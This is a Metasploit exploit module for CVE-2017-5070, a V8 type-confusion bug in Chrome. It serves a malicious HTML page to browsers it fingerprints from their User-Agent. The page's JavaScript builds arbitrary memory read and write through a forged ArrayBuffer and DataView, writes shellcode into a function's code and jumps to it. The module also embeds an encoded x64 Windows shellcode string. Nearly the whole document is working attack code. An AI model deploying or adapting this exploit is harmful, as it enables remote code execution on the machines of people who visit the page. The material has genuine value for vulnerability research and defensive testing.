##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "CVE-2017-5070 Type confusion in V8",
            'Description'    => %q{
              Type confusion in V8 in Google Chrome prior to 59.0.3071.86 for Linux, Windows, and Mac, and 59.0.3071.92 for Android, allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.(CVE-2017-5070)
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'Zhao Qixun (Qihoo 360 Vulcan Team)',          # Original RE research and exploitation
                'Youngjoon Kim <acorn421[at]gmail.com>'        # Metasploit module
              ],
            'Platform'       => 'win',
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'Chrome on Windows 7', { } ],
                [ 'Chrome 58.0.3029.110 on Windows 7', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2017-5070' ],   
                [ 'CBT', '722756' ]       # Chromium Bug Tracker
              ],
            'Arch'           => ARCH_X64,
            'DisclosureDate' => "May 16 2017",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
  
      cm_name = "Chrome #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
        if (!cm.empty? && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      js_p = get_payload(t)

      html = <<-HTML
      <script>
        /* author:Qixun Zhao Of Qihoo 360 Vulcan Team
          weibo:老实敦厚的大宝
          twitter:@S0rryMybad
        */
        var shellcode = [0xcccccccc,0x90909090];
        var ab = new ArrayBuffer(0x20);
        //test_obj = ut32.__proto__;
        flag = 0;
        function gc(){
          for(var i=0;i<0x100000/0x10;i++){
            new String;
          }
        }
        function d2u(num1,num2){
          d = new Uint32Array(2);
          d[0] = num2;
          d[1] = num1;
          f = new Float64Array(d.buffer);
          return f[0];
        }
        function u2d(num){
          f = new Float64Array(1);
          f[0] = num;
          d = new Uint32Array(f.buffer);
          return d[1] * 0x100000000 + d[0];
        }
        function change_to_float(intarr,floatarr){
          var j = 0;
          for(var i = 0;i < intarr.length;i = i+2){
            var re = d2u(intarr[i+1],intarr[i]);
            floatarr[j] = re;
            j++;
          }
        }
        

        
        
        var smi_arr = [1];
        smi_arr.evil = 1;
        
        var double_arr = [1.1,2.2];
        double_arr.evil = 1;
        
        var obj_arr = [{}];
        obj_arr.evil = 1;
        
        var array = [smi_arr,double_arr,obj_arr];
        
        var double_arr_2 = [1.1,2.2];
        double_arr_2.evil = 1;
        
        var vauleOf = {};
        valueOf.valueOf = function(){
          if(flag == 1){
            array[0x1] = double_arr_2;
            
          }
          return 1;
        };
        function read_obj_addr(object){
          function carry_me_plz(arr,obj){
            for(var i = 0;i < arr.length;i++){
              var o = arr[i];
              o[0] = obj;
            }
          }
          function sorry(){
            1 + valueOf;
            double_arr_2[0] = 1.1;
            carry_me_plz(array,object);
            return double_arr_2[0];
          }
          for(var i = 0;i < 0x10000;i++){
            carry_me_plz(array,object);
          }
          for(var i = 0;i < 0x10000;i++){
            sorry();
          }
          flag = 1;
          re = u2d(sorry());
          return re;
        }
        
        //alert(addr);
        var nop = 0xdaba0000;
        var ab_map_obj = [
          nop,nop,
          0x1f000008,0x000900c0,0x082003ff,0x0,
          nop,nop,   // use ut32.prototype replace it
          nop,nop,0x0,0x0
        ]
        ab_proto_addr = read_obj_addr(ab.__proto__);
        ab_constructor_addr = ab_proto_addr - 0x70;
        //alert(ab_proto_addr.toString(16));
        ab_map_obj[0x6] = ab_proto_addr & 0xffffffff;
        ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
        ab_map_obj[0x8] = ab_constructor_addr & 0xffffffff;
        ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
        float_arr = [];
        /*for(var i = 0;i < 0x100;i++){
          float_arr[i] = [1.1,1.1,1.1,1.1,1.1,1.1];
        }*/
        gc();
        var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
        change_to_float(ab_map_obj,ab_map_obj_float);
        
        //alert(u2d(ut32_map_obj_float[0x3]).toString(16));
        
        flag = 0;
        var smi_arr2 = [1];
        smi_arr2.evil = 1;
        
        var double_arr2 = [1.1,2.2];
        double_arr2.evil = 1;
        
        var obj_arr2 = [{}];
        obj_arr2.evil = 1;
        
        var array2 = [smi_arr2,double_arr2,obj_arr2];
        
        var double_arr22 = [1.1,2.33];
        double_arr22.evil = 1;
        
        var valueOf2 = {};
        valueOf2.valueOf = function(){
          if(flag == 1){
            array2[0x1] = double_arr22;
            
          }
          return 1;
        };
        function read_obj_addr2(object){
          function carry_me_plz(arr,obj){
            for(var i = 0;i < arr.length;i++){
              var o = arr[i];
              o[0] = obj;
            }
          }
          function sorry(){
            1 + valueOf2;
            double_arr22[0] = 1.1;
            carry_me_plz(array2,object);
            return double_arr22[0];
          }
          for(var i = 0;i < 0x10000;i++){
            carry_me_plz(array2,object);
          }
          for(var i = 0;i < 0x10000;i++){
            sorry();
          }
          flag = 1;
          re = u2d(sorry());
          return re;
        }
        ab_map_obj_addr = read_obj_addr2(ab_map_obj_float) + 0x40;
        //alert(ab_map_obj_addr.toString(16));
        
        
        var fake_ab = [
          ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
          ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
          ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
          0x0,0x4000, /* buffer length */
          0x12345678,0x123,/* buffer address */
          0x4,0x0
        ]
        var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
        change_to_float(fake_ab,fake_ab_float);
        
        flag = 0;
        var smi_arr3 = [1];
        smi_arr3.evil = 1;
        
        var double_arr3 = [1.1,2.2];
        double_arr3.evil = 1;
        
        var obj_arr3 = [{}];
        obj_arr3.evil = 1;
        
        var array3 = [smi_arr3,double_arr3,obj_arr3];
        
        var double_arr32 = [1.1,2.33];
        double_arr32.evil = 1;
        
        var valueOf3 = {};
        valueOf3.valueOf = function(){
          if(flag == 1){
            array3[0x1] = double_arr32;
            
          }
          return 1;
        };
        function read_obj_addr3(object){
          function carry_me_plz(arr,obj){
            for(var i = 0;i < arr.length;i++){
              var o = arr[i];
              o[0] = obj;
            }
          }
          function sorry(){
            1 + valueOf3;
            double_arr32[0] = 1.1;
            carry_me_plz(array3,object);
            return double_arr32[0];
          }
          for(var i = 0;i < 0x10000;i++){
            carry_me_plz(array3,object);
          }
          for(var i = 0;i < 0x10000;i++){
            sorry();
          }
          flag = 1;
          re = u2d(sorry());
          return re;
        }
        fake_ab_float_addr = read_obj_addr3(fake_ab_float) + 0x40;
        //alert(fake_ab_float_addr.toString(16));
        
        
        
        flag = 0;
        var smi_arr4 = [1];
        smi_arr4.evil = 1;
        
        var double_arr4 = [1.1,2.2];
        double_arr4.evil = 1;
        
        var obj_arr4 = [{}];
        obj_arr4.evil = 1;
        
        var array4 = [smi_arr4,double_arr4,obj_arr4];
        
        var double_arr42 = [1.1,2.33];
        double_arr42.evil = 1;
        
        var valueOf4 = {};
        valueOf4.valueOf = function(){
          if(flag == 1){
            array4[0x1] = double_arr42;
            
          }
          return 1;
        };
        fake_ab_float_addr_f = d2u(fake_ab_float_addr / 0x100000000,fake_ab_float_addr & 0xffffffff).toString();
        function carry_me_plz_fake(arr){
          for(var i = 0;i < arr.length;i++){
            var o = arr[i];
            ttt = o[0];
          }
        }
        eval('function sorry_fake(){1 + valueOf4;double_arr42[0] = 1.1;carry_me_plz_fake(array4);double_arr42[1] = '+fake_ab_float_addr_f+';}')
        for(var i = 0;i < 0x1000;i++){
          carry_me_plz_fake(array3);
        }
        for(var i = 0;i < 0x1000;i++){
          sorry_fake();
        }
        flag = 1;
        sorry_fake();
        fake_arraybuffer = double_arr42[1];
        fake_dv = new DataView(fake_arraybuffer,0,0x4000);
        //Read32(0xdaba0,1);
        //alert(fake_ab_float[4]);
        
        
        var func_body = "eval('');";
        /*for(var i=0;i < 0x1000;i++){
          func_body += "a[" + i.toString() + "];";
        }*/
        var function_to_shellcode = new Function("a",func_body);
        flag = 0;
        var smi_arr5 = [1];
        smi_arr5.evil = 1;
        
        var double_arr5 = [1.1,2.2];
        double_arr5.evil = 1;
        
        var obj_arr5 = [{}];
        obj_arr5.evil = 1;
        
        var array5 = [smi_arr5,double_arr5,obj_arr5];
        
        var double_arr52 = [1.1,2.33];
        double_arr52.evil = 1;
        
        var valueOf5 = {};
        valueOf5.valueOf = function(){
          if(flag == 1){
            array5[0x1] = double_arr52;
            
          }
          return 1;
        };
        function read_obj_addr5(object){
          function carry_me_plz(arr,obj){
            for(var i = 0;i < arr.length;i++){
              var o = arr[i];
              o[0] = obj;
            }
          }
          function sorry(){
            1 + valueOf5;
            double_arr52[0] = 1.1;
            carry_me_plz(array5,object);
            return double_arr52[0];
          }
          for(var i = 0;i < 0x1000;i++){
            carry_me_plz(array5,object);
          }
          for(var i = 0;i < 0x1000;i++){
            sorry();
          }
          flag = 1;
          re = u2d(sorry());
          return re;
        }
        shellcode_address_ref = read_obj_addr5(function_to_shellcode) + 0x38-1;
        //alert(shellcode_address_ref.toString(16));
        
        /**************************************  And now,we get arbitrary memory read write!!!!!!   ******************************************/
        
        function Read32(addr){
          fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
          //fake_dv = new DataView(fake_arraybuffer,0,0x4000);
          //alert(fake_ab_float[4]);
          return fake_dv.getUint32(0,true);
        }
        function Write32(addr,value){
          fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
          //fake_dv = new DataView(fake_arraybuffer,0,0x4000);
          //alert(fake_ab_float[4]);
          alert("write");		
          fake_dv.setUint32(0,value,true);
        }
        //alert(shellcode_address_ref.toString(16));
        shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) * 0x100000000;;
        //shellcode_address = Read32(0xdaba0) + Read32(shellcode_address_ref+0x4) * 0x100000000;
        //alert(shellcode_address.toString(16));
        
        var addr = shellcode_address;
        
        fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
        for(var i = 0; i < shellcode.length;i++){
          //alert("write");
          var value = shellcode[i];		
          fake_dv.setUint32(i * 4,value,true);
        }
        alert("go to shellcode plz,chrome!");
        function_to_shellcode();
      </script>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
      if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
      end
  
      print_status("Target selected as: #{target.name}")
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end

